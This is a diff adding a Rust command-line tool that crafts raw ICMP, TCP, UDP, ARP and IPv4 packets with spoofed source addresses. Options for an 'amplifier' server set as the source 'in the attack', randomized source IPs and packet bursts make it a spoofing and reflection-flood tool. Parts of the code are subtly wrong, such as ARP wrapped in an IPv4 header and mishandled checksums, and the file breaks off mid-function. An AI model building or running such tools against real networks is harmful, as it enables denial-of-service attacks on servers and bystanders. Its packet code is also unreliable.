@@ -1,0 +1,1594 @@
+use clap::{Parser, Subcommand};
+use colored::*;
+use log::{error, info, warn, LevelFilter};
+use pcap::{Capture, Linktype, Packet as PcapPacket};
+use pnet::datalink::MacAddr;
+use pnet::packet::arp::{ArpOperation, MutableArpPacket};
+use pnet::packet::ethernet::EtherTypes;
+use pnet::packet::icmp::echo_reply::MutableEchoReplyPacket;
+use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
+use pnet::packet::icmp::{IcmpCode, IcmpType, MutableIcmpPacket};
+use pnet::packet::ip::{IpNextHeaderProtocol, IpNextHeaderProtocols};
+use pnet::packet::ipv4::MutableIpv4Packet;
+use pnet::packet::tcp::MutableTcpPacket;
+use pnet::packet::udp::MutableUdpPacket;
+use pnet::packet::{MutablePacket, Packet};
+use pnet::util::checksum;
+use rand::Rng;
+use simplelog::*;
+use socket2::{Domain, Protocol, Socket, Type};
+use std::fs::File;
+use std::io::{self, ErrorKind, Read, Write};
+use std::net::{IpAddr, Ipv4Addr, SocketAddr};
+use std::str::FromStr;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use std::sync::Mutex;
+use std::thread;
+use std::time::{Duration, Instant};
+
+const IPV4_HEADER_LEN: usize = 20;
+
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    #[command(subcommand)]
+    command: Commands,
+}
+
+#[derive(Subcommand, Debug)]
+enum Commands {
+    Send {
+        #[arg(
+            short = 's',
+            long,
+            default_value = "127.0.0.1",
+            help = "Source IP address"
+        )]
+        source_ip: String,
+        #[arg(
+            short = 't',
+            long,
+            default_value = "127.0.0.1",
+            help = "Target IP address"
+        )]
+        target_ip: String,
+        #[arg(
+            short = 'r',
+            long,
+            default_value = "icmp",
+            help = "Protocol to use (icmp, tcp, udp, arp)"
+        )]
+        protocol: String,
+        #[arg(
+            short = 'p',
+            long,
+            default_value = "Hello, this is a spoofed packet!",
+            help = "Payload to send"
+        )]
+        payload: String,
+        #[arg(long, default_value_t = 64, help = "Time-to-live for IP packets")]
+        ttl: u8,
+        #[arg(
+            long,
+            default_value_t = false,
+            help = "Randomize source ports for TCP and UDP packets"
+        )]
+        randomize: bool,
+        #[arg(long, default_value_t = 10, help = "Rate limit in milliseconds")]
+        rate_limit_ms: u64,
+        #[arg(long, help = "Save generated packets to pcap file")]
+        pcap_file: Option<String>,
+        #[arg(
+            long,
+            help = "TCP flags (SYN, ACK, FIN, RST, PSH, URG, ECE, CWR). Example: SYN,ACK,URG"
+        )]
+        tcp_flags: Option<String>,
+        #[arg(
+            long,
+            help = "ICMP type (EchoRequest = 8, EchoReply = 0, DestinationUnreachable = 3)"
+        )]
+        icmp_type: Option<u8>,
+        #[arg(long, help = "UDP destination port")]
+        udp_dest_port: Option<u16>,
+        #[arg(long, help = "Timeout for packet sending in seconds")]
+        timeout: Option<u64>,
+        #[arg(long, help = "Number of packets in burst")]
+        burst_size: Option<usize>,
+        #[arg(long, help = "Delay between bursts, or in ms if no burst is set")]
+        delay: Option<u64>,
+        #[arg(
+            long,
+            help = "Set a public server to be the amplifier, set as the source ip in the attack"
+        )]
+        amplifier_server: Option<String>,
+        #[arg(long, help = "Set to true to randomize the source ip")]
+        randomize_source: bool,
+        #[arg(long, help = "Set to true to randomize the delay")]
+        randomize_delay: bool,
+    },
+}
+
+struct PacketGenerator {
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    protocol: ProtocolType,
+    payload: Vec<u8>,
+    ttl: u8,
+    randomize: bool,
+    running: Arc<AtomicBool>,
+    packets_sent: Arc<Mutex<usize>>,
+    rate_limit_ms: u64,
+    pcap_file: Option<String>,
+    tcp_flags: u16,
+    icmp_type: u8,
+    udp_dest_port: u16,
+    burst_size: usize,
+    delay: u64,
+    amplifier_server: Option<Ipv4Addr>,
+    randomize_source: bool,
+    randomize_delay: bool,
+}
+
+#[derive(Debug, PartialEq, Clone, Copy)]
+enum ProtocolType {
+    ICMP,
+    TCP,
+    UDP,
+    ARP,
+    RAW,
+}
+
+impl FromStr for ProtocolType {
+    type Err = ();
+    fn from_str(s: &str) -> Result<Self, Self::Err> {
+        match s.to_lowercase().as_str() {
+            "icmp" => Ok(ProtocolType::ICMP),
+            "tcp" => Ok(ProtocolType::TCP),
+            "udp" => Ok(ProtocolType::UDP),
+            "arp" => Ok(ProtocolType::ARP),
+            "raw" => Ok(ProtocolType::RAW),
+            _ => Err(()),
+        }
+    }
+}
+
+trait PacketBuilder {
+    fn build_ip_header(&self, buffer: &mut [u8], protocol: IpNextHeaderProtocol, total_len: u16);
+    fn build_packet(&self, buffer: &mut [u8]) -> usize;
+    fn get_packet_type(&self) -> String; // Added method to get the packet type
+    fn visualize_packet(&self, buffer: &[u8], packet_len: usize);
+}
+
+struct IcmpPacketBuilder {
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    icmp_type: u8,
+    payload: Vec<u8>,
+    ttl: u8,
+    amplifier_server: Option<Ipv4Addr>,
+}
+
+impl IcmpPacketBuilder {
+    fn new(
+        source_ip: Ipv4Addr,
+        target_ip: Ipv4Addr,
+        icmp_type: u8,
+        payload: Vec<u8>,
+        ttl: u8,
+        amplifier_server: Option<Ipv4Addr>,
+    ) -> Self {
+        IcmpPacketBuilder {
+            source_ip,
+            target_ip,
+            icmp_type,
+            payload,
+            ttl,
+            amplifier_server,
+        }
+    }
+}
+
+impl PacketBuilder for IcmpPacketBuilder {
+    fn get_packet_type(&self) -> String {
+        "ICMP".to_string()
+    }
+
+    fn build_ip_header(&self, buffer: &mut [u8], protocol: IpNextHeaderProtocol, total_len: u16) {
+        let mut ip_header =
+            MutableIpv4Packet::new(buffer).expect("Failed to create mutable IPv4 header");
+        ip_header.set_version(4);
+        ip_header.set_header_length(5);
+        ip_header.set_dscp(0);
+        ip_header.set_ecn(0);
+        ip_header.set_total_length(total_len);
+        ip_header.set_identification(rand::random());
+        ip_header.set_flags(0);
+        ip_header.set_fragment_offset(0);
+        ip_header.set_ttl(self.ttl);
+        ip_header.set_next_level_protocol(protocol);
+        match self.amplifier_server {
+            Some(ip) => ip_header.set_source(ip),
+            None => ip_header.set_source(self.source_ip),
+        }
+        ip_header.set_destination(self.target_ip);
+        let checksum = checksum(ip_header.packet(), 0);
+        ip_header.set_checksum(checksum);
+    }
+
+    fn build_packet(&self, buffer: &mut [u8]) -> usize {
+        let icmp_len = 8 + self.payload.len();
+        let total_len = (IPV4_HEADER_LEN + icmp_len) as u16;
+
+        let (ip_header_slice, icmp_packet_slice) = buffer.split_at_mut(IPV4_HEADER_LEN);
+        self.build_ip_header(ip_header_slice, IpNextHeaderProtocols::Icmp, total_len);
+
+        let mut icmp_packet = MutableIcmpPacket::new(icmp_packet_slice)
+            .expect("Failed to create mutable ICMP packet");
+        icmp_packet.set_icmp_type(IcmpType(self.icmp_type));
+        icmp_packet.set_icmp_code(IcmpCode(0));
+
+        match self.icmp_type {
+            0 => {
+                let mut echo_reply_packet =
+                    MutableEchoReplyPacket::new(icmp_packet.packet_mut()).unwrap();
+                echo_reply_packet.set_identifier(rand::random());
+                echo_reply_packet.set_sequence_number(1);
+            }
+            8 => {
+                let mut echo_request_packet =
+                    MutableEchoRequestPacket::new(icmp_packet.packet_mut()).unwrap();
+                echo_request_packet.set_identifier(rand::random());
+                echo_request_packet.set_sequence_number(1);
+            }
+            _ => {
+                warn!("ICMP type {} not fully implemented", self.icmp_type);
+            }
+        }
+
+        let payload_start = 8;
+        let _payload_end = payload_start + self.payload.len();
+        icmp_packet.payload_mut()[..self.payload.len()].copy_from_slice(&self.payload);
+        let checksum = checksum(icmp_packet.packet(), 0);
+        icmp_packet.set_checksum(checksum);
+
+        IPV4_HEADER_LEN + icmp_len
+    }
+    fn visualize_packet(&self, buffer: &[u8], packet_len: usize) {
+        let ip_header_len = IPV4_HEADER_LEN;
+        let icmp_header_len = 8;
+        let payload_len = packet_len - ip_header_len - icmp_header_len;
+
+        println!("{}", "  Packet Structure:".bold().underline());
+
+        // IP Header
+        println!("{}", "  [IPv4 Header]".bold());
+        if buffer.len() >= ip_header_len {
+            let ip_header = &buffer[0..ip_header_len];
+            println!(
+                "  | Version: {:x} | Header Len: {} | DSCP: {:x} | ECN: {:x} | Total Len: {} | ID: {} | Flags: {:x} | Frag Offset: {} | TTL: {} | Protocol: {} | Checksum: {} | Source IP: {} | Dest IP: {} |",
+                ip_header[0] >> 4, // Version
+                ip_header[0] & 0x0F, // Header Length
+                ip_header[1] >> 2,
+                ip_header[1] & 0x03,
+                u16::from_be_bytes([ip_header[2], ip_header[3]]),
+                u16::from_be_bytes([ip_header[4], ip_header[5]]),
+                (ip_header[6] >> 5) & 0x07,
+                u16::from_be_bytes([ip_header[6] & 0x1F, ip_header[7]]),
+                ip_header[8],
+                ip_header[9],
+                u16::from_be_bytes([ip_header[10], ip_header[11]]),
+                Ipv4Addr::from(u32::from_be_bytes([ip_header[12], ip_header[13], ip_header[14], ip_header[15]])),
+                Ipv4Addr::from(u32::from_be_bytes([ip_header[16], ip_header[17], ip_header[18], ip_header[19]])),
+            );
+        } else {
+            println!("{}", "  | Incomplete IP Header |".red());
+        }
+        // ICMP Header
+        println!("{}", "  [ICMP Header]".bold());
+        if buffer.len() >= ip_header_len + icmp_header_len {
+            let icmp_header = &buffer[ip_header_len..ip_header_len + icmp_header_len];
+            println!(
+                "  | Type: {} | Code: {} | Checksum: {} | Identifier: {} | Sequence Number: {} |",
+                icmp_header[0],
+                icmp_header[1],
+                u16::from_be_bytes([icmp_header[2], icmp_header[3]]),
+                u16::from_be_bytes([icmp_header[4], icmp_header[5]]),
+                u16::from_be_bytes([icmp_header[6], icmp_header[7]])
+            );
+        } else {
+            println!("{}", " | Incomplete ICMP Header |".red());
+        }
+
+        // Payload
+        println!("{}", "  [Payload]".bold());
+        if buffer.len() >= ip_header_len + icmp_header_len && payload_len > 0 {
+            let payload = &buffer[ip_header_len + icmp_header_len..packet_len];
+            let payload_str = String::from_utf8_lossy(payload);
+            println!("   Payload ({}) : {}", payload_len, payload_str.green());
+        } else {
+            println!("{}", "  | No Payload |".green());
+        }
+        println!(
+            "{}",
+            "--------------------------------------------------".yellow()
+        );
+    }
+}
+
+struct TcpPacketBuilder {
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    tcp_flags: u16,
+    payload: Vec<u8>,
+    randomize: bool,
+    ttl: u8,
+    amplifier_server: Option<Ipv4Addr>,
+}
+
+impl TcpPacketBuilder {
+    fn new(
+        source_ip: Ipv4Addr,
+        target_ip: Ipv4Addr,
+        tcp_flags: u16,
+        payload: Vec<u8>,
+        randomize: bool,
+        ttl: u8,
+        amplifier_server: Option<Ipv4Addr>,
+    ) -> Self {
+        TcpPacketBuilder {
+            source_ip,
+            target_ip,
+            tcp_flags,
+            payload,
+            randomize,
+            ttl,
+            amplifier_server,
+        }
+    }
+}
+
+impl PacketBuilder for TcpPacketBuilder {
+    fn get_packet_type(&self) -> String {
+        "TCP".to_string()
+    }
+    fn build_ip_header(&self, buffer: &mut [u8], protocol: IpNextHeaderProtocol, total_len: u16) {
+        let mut ip_header =
+            MutableIpv4Packet::new(buffer).expect("Failed to create mutable IPv4 header");
+        ip_header.set_version(4);
+        ip_header.set_header_length(5);
+        ip_header.set_dscp(0);
+        ip_header.set_ecn(0);
+        ip_header.set_total_length(total_len);
+        ip_header.set_identification(rand::random());
+        ip_header.set_flags(0);
+        ip_header.set_fragment_offset(0);
+        ip_header.set_ttl(self.ttl);
+        ip_header.set_next_level_protocol(protocol);
+        match self.amplifier_server {
+            Some(ip) => ip_header.set_source(ip),
+            None => ip_header.set_source(self.source_ip),
+        }
+        ip_header.set_destination(self.target_ip);
+        let checksum = checksum(ip_header.packet(), 0);
+        ip_header.set_checksum(checksum);
+    }
+
+    fn build_packet(&self, buffer: &mut [u8]) -> usize {
+        let tcp_len = 20 + self.payload.len();
+        let total_len = (IPV4_HEADER_LEN + tcp_len) as u16;
+
+        self.build_ip_header(buffer, IpNextHeaderProtocols::Tcp, total_len);
+
+        let payload_start = IPV4_HEADER_LEN + 20;
+        let (tcp_header_slice, payload_slice) = buffer.split_at_mut(payload_start);
+
+        let mut tcp_packet =
+            MutableTcpPacket::new(tcp_header_slice).expect("Failed to create mutable TCP packet");
+        let mut rng = rand::thread_rng();
+
+        let src_port = if self.randomize {
+            rng.gen_range(1024..65535)
+        } else {
+            12345
+        };
+        let dest_port = 80;
+
+        tcp_packet.set_source(src_port);
+        tcp_packet.set_destination(dest_port);
+        tcp_packet.set_sequence(rand::random());
+        tcp_packet.set_acknowledgement(0);
+        tcp_packet.set_data_offset(5);
+        tcp_packet.set_flags(self.tcp_flags as u8);
+        tcp_packet.set_window(65535);
+        tcp_packet.set_urgent_ptr(0);
+
+        payload_slice[..self.payload.len()].copy_from_slice(&self.payload);
+
+        let pseudo_header_len = 12;
+        let mut pseudo_header = Vec::with_capacity(pseudo_header_len);
+        pseudo_header.extend_from_slice(&self.source_ip.octets());
+        pseudo_header.extend_from_slice(&self.target_ip.octets());
+        pseudo_header.push(0);
+        pseudo_header.push(IpNextHeaderProtocols::Tcp.0);
+        pseudo_header.extend_from_slice(&(tcp_len as u16).to_be_bytes());
+
+        let checksum = checksum(tcp_packet.to_immutable().packet(), pseudo_header.len());
+        tcp_packet.set_checksum(checksum);
+
+        IPV4_HEADER_LEN + tcp_len
+    }
+    fn visualize_packet(&self, buffer: &[u8], packet_len: usize) {
+        let ip_header_len = IPV4_HEADER_LEN;
+        let tcp_header_len = 20;
+        let payload_len = packet_len - ip_header_len - tcp_header_len;
+
+        println!("{}", "  Packet Structure:".bold().underline());
+
+        // IP Header
+        println!("{}", "  [IPv4 Header]".bold());
+        if buffer.len() >= ip_header_len {
+            let ip_header = &buffer[0..ip_header_len];
+            println!(
+                "  | Version: {:x} | Header Len: {} | DSCP: {:x} | ECN: {:x} | Total Len: {} | ID: {} | Flags: {:x} | Frag Offset: {} | TTL: {} | Protocol: {} | Checksum: {} | Source IP: {} | Dest IP: {} |",
+                ip_header[0] >> 4, // Version
+                ip_header[0] & 0x0F, // Header Length
+                ip_header[1] >> 2,
+                ip_header[1] & 0x03,
+                u16::from_be_bytes([ip_header[2], ip_header[3]]),
+                u16::from_be_bytes([ip_header[4], ip_header[5]]),
+                (ip_header[6] >> 5) & 0x07,
+                u16::from_be_bytes([ip_header[6] & 0x1F, ip_header[7]]),
+                ip_header[8],
+                ip_header[9],
+                u16::from_be_bytes([ip_header[10], ip_header[11]]),
+                Ipv4Addr::from(u32::from_be_bytes([ip_header[12], ip_header[13], ip_header[14], ip_header[15]])),
+                 Ipv4Addr::from(u32::from_be_bytes([ip_header[16], ip_header[17], ip_header[18], ip_header[19]])),
+            );
+        } else {
+            println!("{}", "  | Incomplete IP Header |".red());
+        }
+        // TCP Header
+        println!("{}", "  [TCP Header]".bold());
+        if buffer.len() >= ip_header_len + tcp_header_len {
+            let tcp_header = &buffer[ip_header_len..ip_header_len + tcp_header_len];
+            println!(
+                "  | Source Port: {} | Destination Port: {} | Sequence Number: {} | Acknowledgement Number: {} | Data Offset: {} | Flags: {} | Window Size: {} | Checksum: {} | Urgent Pointer: {} |",
+                u16::from_be_bytes([tcp_header[0], tcp_header[1]]),
+                u16::from_be_bytes([tcp_header[2], tcp_header[3]]),
+                u32::from_be_bytes([tcp_header[4], tcp_header[5], tcp_header[6], tcp_header[7]]),
+                u32::from_be_bytes([tcp_header[8], tcp_header[9], tcp_header[10], tcp_header[11]]),
+                (tcp_header[12] >> 4) ,
+                tcp_header[13],
+                u16::from_be_bytes([tcp_header[14], tcp_header[15]]),
+                u16::from_be_bytes([tcp_header[16], tcp_header[17]]),
+                u16::from_be_bytes([tcp_header[18], tcp_header[19]]),
+
+            );
+        } else {
+            println!("{}", "  | Incomplete TCP Header |".red());
+        }
+        // Payload
+        println!("{}", "  [Payload]".bold());
+        if buffer.len() >= ip_header_len + tcp_header_len && payload_len > 0 {
+            let payload = &buffer[ip_header_len + tcp_header_len..packet_len];
+            let payload_str = String::from_utf8_lossy(payload);
+            println!("   Payload ({}) : {}", payload_len, payload_str.green());
+        } else {
+            println!("{}", "  | No Payload |".green());
+        }
+        println!(
+            "{}",
+            "--------------------------------------------------".yellow()
+        );
+    }
+}
+
+struct UdpPacketBuilder {
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    payload: Vec<u8>,
+    randomize: bool,
+    udp_dest_port: u16,
+    ttl: u8,
+    amplifier_server: Option<Ipv4Addr>,
+}
+impl UdpPacketBuilder {
+    fn new(
+        source_ip: Ipv4Addr,
+        target_ip: Ipv4Addr,
+        udp_dest_port: u16,
+        payload: Vec<u8>,
+        randomize: bool,
+        ttl: u8,
+        amplifier_server: Option<Ipv4Addr>,
+    ) -> Self {
+        UdpPacketBuilder {
+            source_ip,
+            target_ip,
+            udp_dest_port,
+            payload,
+            randomize,
+            ttl,
+            amplifier_server,
+        }
+    }
+}
+
+impl PacketBuilder for UdpPacketBuilder {
+    fn get_packet_type(&self) -> String {
+        "UDP".to_string()
+    }
+
+    fn build_ip_header(&self, buffer: &mut [u8], protocol: IpNextHeaderProtocol, total_len: u16) {
+        let mut ip_header =
+            MutableIpv4Packet::new(buffer).expect("Failed to create mutable IPv4 header");
+        ip_header.set_version(4);
+        ip_header.set_header_length(5);
+        ip_header.set_dscp(0);
+        ip_header.set_ecn(0);
+        ip_header.set_total_length(total_len);
+        ip_header.set_identification(rand::random());
+        ip_header.set_flags(0);
+        ip_header.set_fragment_offset(0);
+        ip_header.set_ttl(self.ttl);
+        ip_header.set_next_level_protocol(protocol);
+        match self.amplifier_server {
+            Some(ip) => ip_header.set_source(ip),
+            None => ip_header.set_source(self.source_ip),
+        }
+        ip_header.set_destination(self.target_ip);
+        let checksum = checksum(ip_header.packet(), 0);
+        ip_header.set_checksum(checksum);
+    }
+
+    fn build_packet(&self, buffer: &mut [u8]) -> usize {
+        let udp_len = 8 + self.payload.len();
+        let total_len = (IPV4_HEADER_LEN + udp_len) as u16;
+
+        self.build_ip_header(buffer, IpNextHeaderProtocols::Udp, total_len);
+
+        let payload_start = IPV4_HEADER_LEN + 8;
+        let (udp_header_slice, payload_slice) = buffer.split_at_mut(payload_start);
+        let mut udp_packet =
+            MutableUdpPacket::new(udp_header_slice).expect("Failed to create mutable UDP packet");
+        let mut rng = rand::thread_rng();
+        let src_port = if self.randomize {
+            rng.gen_range(1024..65535)
+        } else {
+            12345
+        };
+        let dest_port = self.udp_dest_port;
+
+        udp_packet.set_source(src_port);
+        udp_packet.set_destination(dest_port);
+        udp_packet.set_length(udp_len as u16);
+
+        payload_slice[..self.payload.len()].copy_from_slice(&self.payload);
+
+        let pseudo_header_len = 12;
+        let mut pseudo_header = Vec::with_capacity(pseudo_header_len);
+        pseudo_header.extend_from_slice(&self.source_ip.octets());
+        pseudo_header.extend_from_slice(&self.target_ip.octets());
+        pseudo_header.push(0);
+        pseudo_header.push(IpNextHeaderProtocols::Udp.0);
+        pseudo_header.extend_from_slice(&(udp_len as u16).to_be_bytes());
+
+        let checksum = checksum(udp_packet.to_immutable().packet(), pseudo_header.len());
+        udp_packet.set_checksum(checksum);
+
+        IPV4_HEADER_LEN + udp_len
+    }
+    fn visualize_packet(&self, buffer: &[u8], packet_len: usize) {
+        let ip_header_len = IPV4_HEADER_LEN;
+        let udp_header_len = 8;
+        let payload_len = packet_len - ip_header_len - udp_header_len;
+
+        println!("{}", "  Packet Structure:".bold().underline());
+
+        // IP Header
+        println!("{}", "  [IPv4 Header]".bold());
+        if buffer.len() >= ip_header_len {
+            let ip_header = &buffer[0..ip_header_len];
+            println!(
+                "  | Version: {:x} | Header Len: {} | DSCP: {:x} | ECN: {:x} | Total Len: {} | ID: {} | Flags: {:x} | Frag Offset: {} | TTL: {} | Protocol: {} | Checksum: {} | Source IP: {} | Dest IP: {} |",
+                 ip_header[0] >> 4, // Version
+                 ip_header[0] & 0x0F, // Header Length
+                 ip_header[1] >> 2,
+                 ip_header[1] & 0x03,
+                 u16::from_be_bytes([ip_header[2], ip_header[3]]),
+                 u16::from_be_bytes([ip_header[4], ip_header[5]]),
+                (ip_header[6] >> 5) & 0x07,
+                u16::from_be_bytes([ip_header[6] & 0x1F, ip_header[7]]),
+                ip_header[8],
+                ip_header[9],
+                u16::from_be_bytes([ip_header[10], ip_header[11]]),
+                Ipv4Addr::from(u32::from_be_bytes([ip_header[12], ip_header[13], ip_header[14], ip_header[15]])),
+                Ipv4Addr::from(u32::from_be_bytes([ip_header[16], ip_header[17], ip_header[18], ip_header[19]])),
+            );
+        } else {
+            println!("{}", "  | Incomplete IP Header |".red());
+        }
+        // UDP Header
+        println!("{}", "  [UDP Header]".bold());
+        if buffer.len() >= ip_header_len + udp_header_len {
+            let udp_header = &buffer[ip_header_len..ip_header_len + udp_header_len];
+            println!(
+                "  | Source Port: {} | Destination Port: {} | Length: {} | Checksum: {} |",
+                u16::from_be_bytes([udp_header[0], udp_header[1]]),
+                u16::from_be_bytes([udp_header[2], udp_header[3]]),
+                u16::from_be_bytes([udp_header[4], udp_header[5]]),
+                u16::from_be_bytes([udp_header[6], udp_header[7]]),
+            );
+        } else {
+            println!("{}", "  | Incomplete UDP Header |".red());
+        }
+        // Payload
+        println!("{}", "  [Payload]".bold());
+        if buffer.len() >= ip_header_len + udp_header_len && payload_len > 0 {
+            let payload = &buffer[ip_header_len + udp_header_len..packet_len];
+            let payload_str = String::from_utf8_lossy(payload);
+            println!("   Payload ({}) : {}", payload_len, payload_str.green());
+        } else {
+            println!("{}", "  | No Payload |".green());
+        }
+        println!(
+            "{}",
+            "--------------------------------------------------".yellow()
+        );
+    }
+}
+
+struct ArpPacketBuilder {
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    ttl: u8,
+}
+impl ArpPacketBuilder {
+    fn new(source_ip: Ipv4Addr, target_ip: Ipv4Addr, ttl: u8) -> Self {
+        ArpPacketBuilder {
+            source_ip,
+            target_ip,
+            ttl,
+        }
+    }
+}
+
+impl PacketBuilder for ArpPacketBuilder {
+    fn get_packet_type(&self) -> String {
+        "ARP".to_string()
+    }
+    fn build_ip_header(&self, buffer: &mut [u8], protocol: IpNextHeaderProtocol, total_len: u16) {
+        let mut ip_header =
+            MutableIpv4Packet::new(buffer).expect("Failed to create mutable IPv4 header");
+        ip_header.set_version(4);
+        ip_header.set_header_length(5);
+        ip_header.set_dscp(0);
+        ip_header.set_ecn(0);
+        ip_header.set_total_length(total_len);
+        ip_header.set_identification(rand::random());
+        ip_header.set_flags(0);
+        ip_header.set_fragment_offset(0);
+        ip_header.set_ttl(self.ttl);
+        ip_header.set_next_level_protocol(protocol);
+        ip_header.set_source(self.source_ip);
+        ip_header.set_destination(self.target_ip);
+        let checksum = checksum(ip_header.packet(), 0);
+        ip_header.set_checksum(checksum);
+    }
+    fn build_packet(&self, buffer: &mut [u8]) -> usize {
+        let arp_len = 28;
+        let total_len = (IPV4_HEADER_LEN + arp_len) as u16;
+
+        self.build_ip_header(buffer, IpNextHeaderProtocols::Srp, total_len);
+
+        let mut arp_packet = MutableArpPacket::new(&mut buffer[IPV4_HEADER_LEN..])
+            .expect("Failed to create mutable ARP packet");
+
+        let target_mac: [u8; 6] = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // Broadcast for resolution, can be changed later
+        let source_mac: [u8; 6] = [0x00, 0x00, 0x00, 0x00, 0x00, 0x01]; // Some random MAC, not checked by ARP
+
+        arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareTypes::Ethernet);
+        arp_packet.set_protocol_type(EtherTypes::Ipv4);
+        arp_packet.set_hw_addr_len(6);
+        arp_packet.set_proto_addr_len(4);
+        arp_packet.set_operation(ArpOperation::new(1));
+
+        arp_packet.set_sender_hw_addr(MacAddr::new(
+            source_mac[0],
+            source_mac[1],
+            source_mac[2],
+            source_mac[3],
+            source_mac[4],
+            source_mac[5],
+        ));
+        arp_packet.set_sender_proto_addr(self.source_ip);
+        arp_packet.set_target_hw_addr(MacAddr::new(
+            target_mac[0],
+            target_mac[1],
+            target_mac[2],
+            target_mac[3],
+            target_mac[4],
+            target_mac[5],
+        ));
+        arp_packet.set_target_proto_addr(self.target_ip);
+
+        IPV4_HEADER_LEN + arp_len
+    }
+    fn visualize_packet(&self, buffer: &[u8], packet_len: usize) {
+        let ip_header_len = IPV4_HEADER_LEN;
+        let arp_header_len = 28;
+
+        println!("{}", "  Packet Structure:".bold().underline());
+        // IP Header
+        println!("{}", "  [IPv4 Header]".bold());
+        if buffer.len() >= ip_header_len {
+            let ip_header = &buffer[0..ip_header_len];
+            println!(
+                    "  | Version: {:x} | Header Len: {} | DSCP: {:x} | ECN: {:x} | Total Len: {} | ID: {} | Flags: {:x} | Frag Offset: {} | TTL: {} | Protocol: {} | Checksum: {} | Source IP: {} | Dest IP: {} |",
+                   ip_header[0] >> 4, // Version
+                   ip_header[0] & 0x0F, // Header Length
+                  ip_header[1] >> 2,
+                   ip_header[1] & 0x03,
+                   u16::from_be_bytes([ip_header[2], ip_header[3]]),
+                  u16::from_be_bytes([ip_header[4], ip_header[5]]),
+                  (ip_header[6] >> 5) & 0x07,
+                    u16::from_be_bytes([ip_header[6] & 0x1F, ip_header[7]]),
+                    ip_header[8],
+                    ip_header[9],
+                    u16::from_be_bytes([ip_header[10], ip_header[11]]),
+                   Ipv4Addr::from(u32::from_be_bytes([ip_header[12], ip_header[13], ip_header[14], ip_header[15]])),
+                    Ipv4Addr::from(u32::from_be_bytes([ip_header[16], ip_header[17], ip_header[18], ip_header[19]])),
+               );
+        } else {
+            println!("{}", "  | Incomplete IP Header |".red());
+        }
+        // ARP Header
+        println!("{}", "  [ARP Header]".bold());
+        if buffer.len() >= ip_header_len + arp_header_len {
+            let arp_header = &buffer[ip_header_len..ip_header_len + arp_header_len];
+            println!(
+                  "  | Hardware Type: {} | Protocol Type: {} | HW Addr Len: {} | Proto Addr Len: {} | Operation: {} | Sender HW Addr: {} | Sender Proto Addr: {} | Target HW Addr: {} | Target Proto Addr: {} |",
+                  u16::from_be_bytes([arp_header[0], arp_header[1]]),
+                 u16::from_be_bytes([arp_header[2], arp_header[3]]),
+                   arp_header[4],
+                    arp_header[5],
+                   u16::from_be_bytes([arp_header[6],arp_header[7]]),
+                   MacAddr::from([arp_header[8],arp_header[9],arp_header[10],arp_header[11],arp_header[12],arp_header[13]]),
+                  Ipv4Addr::from(u32::from_be_bytes([arp_header[14],arp_header[15],arp_header[16],arp_header[17]])),
+                   MacAddr::from([arp_header[18],arp_header[19],arp_header[20],arp_header[21],arp_header[22],arp_header[23]]),
+                 Ipv4Addr::from(u32::from_be_bytes([arp_header[24],arp_header[25],arp_header[26],arp_header[27]]))
+                );
+        } else {
+            println!("{}", " | Incomplete ARP Header |".red());
+        }
+        println!(
+            "{}",
+            "--------------------------------------------------".yellow()
+        );
+    }
+}
+
+struct RawPacketBuilder {
+    source_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    payload: Vec<u8>,
+    ttl: u8,
+    amplifier_server: Option<Ipv4Addr>,
+}
+
+impl RawPacketBuilder {
+    fn new(
+        source_ip: Ipv4Addr,
+        target_ip: Ipv4Addr,
+        payload: Vec<u8>,
+        ttl: u8,
+        amplifier_server: Option<Ipv4Addr>,
+    ) -> Self {
+        RawPacketBuilder {
+            source_ip,
+            target_ip,
+            payload,
+            ttl,
+            amplifier_server,
+        }
+    }
+}
+impl PacketBuilder for RawPacketBuilder {
+    fn get_packet_type(&self) -> String {
+        "RAW".to_string()
+    }
+    fn build_ip_header(&self, buffer: &mut [u8], protocol: IpNextHeaderProtocol, total_len: u16) {
+        let mut ip_header =
+            MutableIpv4Packet::new(buffer).expect("Failed to create mutable IPv4 header");
+        ip_header.set_version(4);
+        ip_header.set_header_length(5);
+        ip_header.set_dscp(0);
+        ip_header.set_ecn(0);
+        ip_header.set_total_length(total_len);
+        ip_header.set_identification(rand::random());
+        ip_header.set_flags(0);
+        ip_header.set_fragment_offset(0);
+        ip_header.set_ttl(self.ttl);
+        ip_header.set_next_level_protocol(protocol);
+        match self.amplifier_server {
+            Some(ip) => ip_header.set_source(ip),
+            None => ip_header.set_source(self.source_ip),
+        }
+        ip_header.set_destination(self.target_ip);
+        let checksum = checksum(ip_header.packet(), 0);
+        ip_header.set_checksum(checksum);
+    }
+
+    fn build_packet(&self, buffer: &mut [u8]) -> usize {
+        let total_len = (IPV4_HEADER_LEN + self.payload.len()) as u16;
+        self.build_ip_header(buffer, IpNextHeaderProtocol::new(255), total_len); //255 for RAW:)
+
+        let payload_start = IPV4_HEADER_LEN;
+        let payload_end = payload_start + self.payload.len();
+        buffer[payload_start..payload_end].copy_from_slice(&self.payload);
+        IPV4_HEADER_LEN + self.payload.len()
+    }
+    fn visualize_packet(&self, buffer: &[u8], packet_len: usize) {
+        let ip_header_len = IPV4_HEADER_LEN;
+        let payload_len = packet_len - ip_header_len;
+
+        println!("{}", "  Packet Structure:".bold().underline());
+
+        // IP Header
+        println!("{}", "  [IPv4 Header]".bold());
+        if buffer.len() >= ip_header_len {
+            let ip_header = &buffer[0..ip_header_len];
+            println!(
+                 "  | Version: {:x} | Header Len: {} | DSCP: {:x} | ECN: {:x} | Total Len: {} | ID: {} | Flags: {:x} | Frag Offset: {} | TTL: {} | Protocol: {} | Checksum: {} | Source IP: {} | Dest IP: {} |",
+               ip_header[0] >> 4, // Version
+                 ip_header[0] & 0x0F, // Header Length
+               ip_header[1] >> 2,
+                 ip_header[1] & 0x03,
+                  u16::from_be_bytes([ip_header[2], ip_header[3]]),
+                  u16::from_be_bytes([ip_header[4], ip_header[5]]),
